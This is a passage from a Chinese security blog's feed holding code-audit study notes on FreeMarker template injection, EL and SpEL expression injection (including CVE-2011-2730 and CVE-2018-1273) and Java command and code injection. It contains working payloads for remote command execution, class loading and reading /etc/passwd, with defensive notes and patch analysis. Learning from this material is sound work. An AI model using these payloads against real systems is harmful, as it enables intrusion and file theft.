attr-equals">=</span><span class="token punctuation">"</span>freemarker.template.utility.ObjectConstructor<span class="token punctuation">"</span></span><span class="token attr-name">?new()</span><span class="token punctuation">></span></span>$&#123;value("java.lang.ProcessBuilder","open","-a","Calculator").start()&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202112032001213.png"></p><h3 id="利用方法三："><a href="#利用方法三：" class="headerlink" title="利用方法三："></a>利用方法三：</h3><p>freemarker.template.utility 里有个 JythonRuntime 类，这里可以通过自定义标签的方式执行 Python 命令，从而构造远程命令执行。</p><p>freemarker.template.utility.JythonRuntime 部分文件代码如下：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">JythonRuntime</span> <span class="token keyword">extends</span> <span class="token class-name">PythonInterpreter</span>    <span class="token keyword">implements</span> <span class="token class-name">TemplateTransformModel</span> <span class="token punctuation">&#123;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token class-name">Writer</span> <span class="token function">getWriter</span><span class="token punctuation">(</span><span class="token keyword">final</span> <span class="token class-name">Writer</span> out<span class="token punctuation">,</span>                            <span class="token keyword">final</span> <span class="token class-name">Map</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">final</span> <span class="token class-name">StringBuilder</span> buf <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">StringBuilder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">final</span> <span class="token class-name">Environment</span> env <span class="token operator">=</span> <span class="token class-name">Environment</span><span class="token punctuation">.</span><span class="token function">getCurrentEnvironment</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">Writer</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token annotation punctuation">@Override</span>            <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">write</span><span class="token punctuation">(</span><span class="token keyword">char</span> cbuf<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token keyword">int</span> off<span class="token punctuation">,</span> <span class="token keyword">int</span> len<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                buf<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span>cbuf<span class="token punctuation">,</span> off<span class="token punctuation">,</span> len<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token annotation punctuation">@Override</span>            <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">flush</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span> <span class="token punctuation">&#123;</span>                <span class="token function">interpretBuffer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                out<span class="token punctuation">.</span><span class="token function">flush</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token annotation punctuation">@Override</span>            <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token function">interpretBuffer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">interpretBuffer</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">synchronized</span> <span class="token punctuation">(</span><span class="token class-name">JythonRuntime</span><span class="token punctuation">.</span><span class="token keyword">this</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    <span class="token class-name">PyObject</span> prevOut <span class="token operator">=</span> systemState<span class="token punctuation">.</span>stdout<span class="token punctuation">;</span>                    <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>                        <span class="token function">setOut</span><span class="token punctuation">(</span>out<span class="token punctuation">)</span><span class="token punctuation">;</span>                        <span class="token function">set</span><span class="token punctuation">(</span><span class="token string">"env"</span><span class="token punctuation">,</span> env<span class="token punctuation">)</span><span class="token punctuation">;</span>                        <span class="token function">exec</span><span class="token punctuation">(</span>buf<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                        buf<span class="token punctuation">.</span><span class="token function">setLength</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">&#125;</span> <span class="token keyword">finally</span> <span class="token punctuation">&#123;</span>                        <span class="token function">setOut</span><span class="token punctuation">(</span>prevOut<span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">&#125;</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>构造 Payload 如下：</p><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>#assign</span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>freemarker.template.utility.JythonRuntime<span class="token punctuation">"</span></span><span class="token attr-name">?new()</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>@value</span><span class="token punctuation">></span></span>import os;os.system("open -a Calculator")<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>@value</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202112032001223.png"></p><h2 id="2、api-函数的利用"><a href="#2、api-函数的利用" class="headerlink" title="2、api 函数的利用"></a>2、api 函数的利用</h2><p>除了 new 函数，还可以利用 api 函数调用 Java API，然后通过 getClassLoader 获取类加载器从而加载恶意类，或者也可以通过 getResource 来实现任意文件读取。</p><p>加载恶意类的 Payload 如下：</p><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>#assign</span> <span class="token attr-name">classLoader</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>object?api.class.getClassLoader()</span><span class="token punctuation">></span></span>$&#123;classLoader.loadClass("Evil.class")&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>任意文件读取的 Payload 如下：</p><pre class="line-numbers language-html" data-language="html"><code class="language-html">&lt;#assign uri=object?api.class.getResource("/").toURI()>  &lt;#assign input=uri?api.create("file:///etc/passwd").toURL().openConnection()>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>#assign</span> <span class="token attr-name">is</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>input?api.getInputStream()</span><span class="token punctuation">></span></span>  FILE:[<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>#list</span> <span class="token attr-name">0..999999999</span> <span class="token attr-name">as</span> <span class="token attr-name">_</span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>#assign</span> <span class="token attr-name">byte</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>is.read()</span><span class="token punctuation">></span></span>      &lt;#if byte == -1>          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>#break</span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>#if</span><span class="token punctuation">></span></span>  $&#123;byte&#125;, <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>#list</span><span class="token punctuation">></span></span>]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>不过 api 内建函数并不能随便使用，必须在配置项 apiBuiltinEnabled 为 true 时才有效，而该配置在 2.3.22 版本之后默认为 false</p><p>同时 FreeMarker 为了防御通过其他方式调用恶意方法，FreeMarker 内置了一份危险方法名单 unsafeMethods.properties，例如 getClassLoader、newInstance 等危险方法都被禁用了。</p><blockquote><p>参考文章：</p><p><a href="https://www.anquanke.com/post/id/215348">https://www.anquanke.com/post/id/215348</a></p><p><a href="https://www.cnblogs.com/Eleven-Liu/p/12747908.html">https://www.cnblogs.com/Eleven-Liu/p/12747908.html</a></p><p>更多信息欢迎关注我的个人微信公众号：TeamsSix</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/TeamsSix_Subscription_Logo2.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;0x00-介绍&quot;&gt;&lt;a href=&quot;#0x00-介绍&quot; class=&quot;headerlink&quot; title=&quot;0x00 介绍&quot;&gt;&lt;/a&gt;0x00 介绍&lt;/h1&gt;&lt;p&gt;这里主要学习下 FreeMarker 模板注入，FreeMarker 是一款模板引擎，FreeMar</summary>
      
    
    
    
    <category term="代码审计" scheme="https://www.teamssix.com/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
    <category term="学习笔记" scheme="https://www.teamssix.com/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    <category term="代码审计" scheme="https://www.teamssix.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>【代码审计】表达式注入</title>
    <link href="https://www.teamssix.com/211129-180558.html"/>
    <id>https://www.teamssix.com/211129-180558.html</id>
    <published>2021-11-29T10:05:58.000Z</published>
    <updated>2021-11-29T10:23:05.294Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1、介绍"><a href="#1、介绍" class="headerlink" title="1、介绍"></a>1、介绍</h2><p>表达式语言（Expression Language）简称 EL 表达式，是一种 JSP 内置的语言。</p><p>在 JSP 中，使用 ${} 来表示 EL 表达式，例如 ${name} 表示获取 name 变量。</p><p>在 EL 表达式中有两种获取对象属性的方法，第一种为 ${param.name}，第二种为 ${param[name]}</p><h2 id="2、实例"><a href="#2、实例" class="headerlink" title="2、实例"></a>2、实例</h2><h3 id="使用实例"><a href="#使用实例" class="headerlink" title="使用实例"></a>使用实例</h3><p>使用 param 对象获取用户传入的参数值，这里的 ${param.name} 相当于 request.getParameter(“name”)</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token operator">&lt;</span><span class="token operator">%</span>@ page contentType<span class="token operator">=</span><span class="token string">"text/html; charset=UTF-8"</span> pageEncoding<span class="token operator">=</span><span class="token string">"UTF-8"</span> <span class="token operator">%</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">!</span>DOCTYPE html<span class="token operator">></span><span class="token generics"><span class="token punctuation">&lt;</span>html<span class="token punctuation">></span></span><span class="token generics"><span class="token punctuation">&lt;</span>head<span class="token punctuation">></span></span>    <span class="token generics"><span class="token punctuation">&lt;</span>title<span class="token punctuation">></span></span>EL 表达式实例页面<span class="token operator">&lt;</span><span class="token operator">/</span>title<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>head<span class="token operator">></span><span class="token generics"><span class="token punctuation">&lt;</span>body<span class="token punctuation">></span></span><span class="token generics"><span class="token punctuation">&lt;</span>h3<span class="token punctuation">></span></span>输入的 name 值为：$<span class="token punctuation">&#123;</span>param<span class="token punctuation">.</span>name<span class="token punctuation">&#125;</span><span class="token operator">&lt;</span><span class="token operator">/</span>h3<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>body<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>html<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这样当我们访问 <a href="http://xxx:8080/xxx/?name=teamssix">http://xxx:8080/xxx/?name=teamssix</a> 的时候，页面就会返回「输入的 name 值为：teamssix」</p><p>EL 表达式也可以实例化 Java 的内置类，比如 Runtime.class 会执行系统命令</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token operator">&lt;</span><span class="token operator">%</span>@ page contentType<span class="token operator">=</span><span class="token string">"text/html; charset=UTF-8"</span> pageEncoding<span class="token operator">=</span><span class="token string">"UTF-8"</span> <span class="token operator">%</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">!</span>DOCTYPE html<span class="token operator">></span><span class="token generics"><span class="token punctuation">&lt;</span>html<span class="token punctuation">></span></span><span class="token generics"><span class="token punctuation">&lt;</span>head<span class="token punctuation">></span></span>    <span class="token generics"><span class="token punctuation">&lt;</span>title<span class="token punctuation">></span></span>EL 表达式实例页面<span class="token operator">&lt;</span><span class="token operator">/</span>title<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>head<span class="token operator">></span><span class="token generics"><span class="token punctuation">&lt;</span>body<span class="token punctuation">></span></span>$<span class="token punctuation">&#123;</span><span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token string">"calc"</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token operator">&lt;</span><span class="token operator">/</span>body<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>html<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>当执行该页面代码时，就可以看到计算器被弹出来了，不过前提是 Tomcat 被部署在 Windows 下，如果在 Linux 下则需要将 calc 换成其他命令，不然会报错 500</p><h3 id="Spring-标签-EL-表达式漏洞（CVE-2011-2730）"><a href="#Spring-标签-EL-表达式漏洞（CVE-2011-2730）" class="headerlink" title="Spring 标签 EL 表达式漏洞（CVE-2011-2730）"></a>Spring 标签 EL 表达式漏洞（CVE-2011-2730）</h3><p>在历史上出现过一个 Spring 标签 EL 表达式漏洞（CVE-2011-2730），Spring 表达式语言（SpEL）是一种与 EL 功能类似的表达式语言。</p><p>在未对用户的输入做严格检查并且错误的使用 Spring 表达式语言时就可能产生表达式注入漏洞。</p><p>在 SpEL 的 Evaluation 接口中，有两个实现方法，分别为 SimpleEvaluationContext 和 StandardEvaluationContext 方法，其中前者权限比较小，后者权限比较大，因此当使用 StandardEvaluation 方法时，就可以利用 Runtime.class 方法执行命令，例如以下代码：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>expression<span class="token punctuation">.</span></span><span class="token class-name">EvaluationContext</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>expression<span class="token punctuation">.</span></span><span class="token class-name">Expression</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>expression<span class="token punctuation">.</span></span><span class="token class-name">ExpressionParser</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>expression<span class="token punctuation">.</span>spel<span class="token punctuation">.</span>standard<span class="token punctuation">.</span></span><span class="token class-name">SpelExpressionParser</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>expression<span class="token punctuation">.</span>spel<span class="token punctuation">.</span>support<span class="token punctuation">.</span></span><span class="token class-name">StandardEvaluationContext</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">SpEL</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">mian</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">String</span> expressionstr <span class="token operator">=</span> <span class="token string">"T(Runtime).getRuntime().exec(\"open -a Calculator\")"</span><span class="token punctuation">;</span>        <span class="token class-name">ExpressionParser</span> parser <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SpelExpressionParser</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">EvaluationContext</span> evaluationContext <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">StandardEvaluationContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Expression</span> expression <span class="token operator">=</span> parser<span class="token punctuation">.</span><span class="token function">parseExpression</span><span class="token punctuation">(</span>expressionstr<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>expression<span class="token punctuation">.</span><span class="token function">getValue</span><span class="token punctuation">(</span>evaluationContext<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="Spring-Data-Commons-远程代码执行漏洞（CVE-2018-1273）"><a href="#Spring-Data-Commons-远程代码执行漏洞（CVE-2018-1273）" class="headerlink" title="Spring Data Commons 远程代码执行漏洞（CVE-2018-1273）"></a>Spring Data Commons 远程代码执行漏洞（CVE-2018-1273）</h3><p>对于 2018 年出的 Spring Data Commons RCE 漏洞，RT 可以通过构造 SpEL 表达式实现 RCE</p><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202111291811883.png"></p><p>通过观察官方补丁，可以发现正是将原来的 StandardEvaluationContext 方法换成了 SimpleEvaluationContext 方法。</p><p>补丁地址：<a href="https://github.com/spring-projects/spring-data-commons/commit/b1a20ae1e82a63f99b3afc6f2aaedb3bf4dc432a?diff=unified#">https://github.com/spring-projects/spring-data-commons/commit/b1a20ae1e82a63f99b3afc6f2aaedb3bf4dc432a</a></p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token number">175</span> <span class="token operator">-</span> <span class="token class-name">StandardEvaluationContext</span> context <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">StandardEvaluationContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">180 + EvaluationContext context &#x3D; SimpleEvaluationContext<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>参考文章：</p><p><a href="https://blog.csdn.net/lup7in/article/details/8659408">https://blog.csdn.net/lup7in/article/details/8659408</a></p><p><a href="https://misakikata.github.io/2018/09/%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/">https://misakikata.github.io/2018/09/%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/</a></p><p>更多信息欢迎关注我的个人微信公众号：TeamsSix</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/TeamsSix_Subscription_Logo2.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;1、介绍&quot;&gt;&lt;a href=&quot;#1、介绍&quot; class=&quot;headerlink&quot; title=&quot;1、介绍&quot;&gt;&lt;/a&gt;1、介绍&lt;/h2&gt;&lt;p&gt;表达式语言（Expression Language）简称 EL 表达式，是一种 JSP 内置的语言。&lt;/p&gt;
&lt;p&gt;在 JS</summary>
      
    
    
    
    <category term="代码审计" scheme="https://www.teamssix.com/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
    <category term="学习笔记" scheme="https://www.teamssix.com/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    <category term="代码审计" scheme="https://www.teamssix.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>【代码审计】命令注入和代码注入</title>
    <link href="https://www.teamssix.com/211121-153433.html"/>
    <id>https://www.teamssix.com/211121-153433.html</id>
    <published>2021-11-21T07:34:33.000Z</published>
    <updated>2021-11-22T08:59:50.091Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x01-命令注入"><a href="#0x01-命令注入" class="headerlink" title="0x01 命令注入"></a>0x01 命令注入</h1><p>在开发过程中，开发人员可能需要对系统文件进行移动、删除或者执行一些系统命令，这时如果执行的命令用户可控，就会导致命令执行漏洞。</p><h2 id="1、示例"><a href="#1、示例" class="headerlink" title="1、示例"></a>1、示例</h2><p>当命令可控时，就可能会导致命令注入，例如以下代码：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">String</span> cmd <span class="token operator">=</span> request<span class="token punctuation">.</span><span class="token function">getParameter</span><span class="token punctuation">(</span><span class="token string">"cmd"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span>cmd<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>这种漏洞原理很简单，主要就是找到执行系统命令的函数，看命令是否可控。</p><p>java 程序中执行系统命令的函数如下：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">Runtime</span><span class="token punctuation">.</span>exec<span class="token class-name">Process</span><span class="token class-name">ProcessBuilder</span><span class="token punctuation">.</span>start<span class="token class-name">GroovyShell</span><span class="token punctuation">.</span>evaluate<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="2、命令注入的限制"><a href="#2、命令注入的限制" class="headerlink" title="2、命令注入的限制"></a>2、命令注入的限制</h2><p>对于系统命令，可以使用连接符来执行多条语句，常见连接符及含义如下：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">;</span>    多个命令顺序执行，命令之间无任何逻辑关系<span class="token operator">|</span>    前面命令输出结果作为后面命令的输入内容<span class="token operator">||</span>   逻辑或，当前面命令执行失败后，后面命令才会执行，否则后面命令不执行<span class="token operator">&amp;</span>    前面命令执行后继续执行后面命令<span class="token operator">&amp;&amp;</span>   逻辑与，当前面命令执行成功后，后面命令才会执行，否则后面命令不执行<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>对于 Java 环境中的命令注入，连接符的使用存在一些限制，例如以下代码：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token string">"ping "</span> <span class="token operator">+</span> url<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这里因为 URL 可控，因此当我们输入 127.0.0.1&amp;ipconfig 时，拼接出来的系统命令就是 ping 127.0.0.1&amp;ipconfig，该命令在系统终端下是能正常运行的，但是在 Java 环境下就会运行失败，这里因为 Java 在程序处理的过程中，会将 127.0.0.1&amp;ipconfig 当做一个完整的字符串而非两条命令，因此上面的代码不存在命令注入。</p><h1 id="0x02-代码注入"><a href="#0x02-代码注入" class="headerlink" title="0x02 代码注入"></a>0x02 代码注入</h1><h2 id="1、介绍"><a href="#1、介绍" class="headerlink" title="1、介绍"></a>1、介绍</h2><p>代码注入因为是直接注入一段代码，因此要比命令注入更加灵活，危害性也更大。</p><p>这里以 Apache Commons collections 组件为例。</p><p>Apache Commons collections 组件 3.1 版本有一段利用反射来完成特定功能的代码，控制相关参数后，就可以进行代码注入。</p><p>这里攻击者可以利用反序列化的方式控制相关参数，完成注入代码，达到执行任意代码的效果。</p><p>与命令注入相比，代码注入更具有灵活性，例如在 Apache Commons collections 反序列化漏洞中直接使用 Runtime.getRuntime().exec() 执行系统命令是无回显的，但如果通过 URLLoader 远程加载类文件以及异常处理机制就可以构造出回显的利用方式。</p><p>这里就以 Apache Commons collections 反序列化漏洞为例，体验一下代码注入，因为现阶段个人水平有限，这里还不能对 Apache Commons collections 反序列化漏洞的原理进行深入分析，等后面学习到相关内容的时候不出意外应该还会碰到这个漏洞，那个时候再好好分析分析这个漏洞。</p><h2 id="2、Apache-Commons-collections-反序列化漏洞复现"><a href="#2、Apache-Commons-collections-反序列化漏洞复现" class="headerlink" title="2、Apache Commons collections 反序列化漏洞复现"></a>2、Apache Commons collections 反序列化漏洞复现</h2><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>该漏洞影响了 3.1 及以下的版本，这里以 3.1 版本为例，首先下载 commons-collections-3.1.zip 文件，下载地址：<a href="https://archive.apache.org/dist/commons/collections/binaries/commons-collections-3.1.zip">https://archive.apache.org/dist/commons/collections/binaries/commons-collections-3.1.zip</a></p><p>解压 commons-collections-3.1.zip 可以得到 commons-collections-3.1.jar 文件，接下来打开 intelliJ IDEA，创建一个普通的 Java 项目，然后选择「文件 –&gt; 项目结构 –&gt; 库 –&gt; + –&gt; Java」，添加 commons-collections-3.1.jar 包，我使用的 jdk 版本为 1.8.0_191</p><p>接下来在「src –&gt; com –&gt; commons」目录下创建 ApacheCommonsCollectionsDemo.java 文件（右击 com.commons 软件包选择：新建 –&gt; Java 类文件）</p><h3 id="无回显利用"><a href="#无回显利用" class="headerlink" title="无回显利用"></a>无回显利用</h3><p>在 ApacheCommonsCollectionsDemo.java 文件下写入以下代码</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>commons</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">HashMap</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Map</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span></span><span class="token class-name">Transformer</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">ChainedTransformer</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">ConstantTransformer</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">InvokerTransformer</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>keyvalue<span class="token punctuation">.</span></span><span class="token class-name">TiedMapEntry</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>map<span class="token punctuation">.</span></span><span class="token class-name">LazyMap</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>map<span class="token punctuation">.</span></span><span class="token class-name">TransformedMap</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ApacheCommonsCollectionsDemo</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token comment">//((Runtime) Runtime.class.getMethod("getRuntime").invoke()).exec("calc")</span>        <span class="token comment">//构造恶意的chain</span>        <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span> transformers <span class="token operator">=</span> <span class="token keyword">new</span> 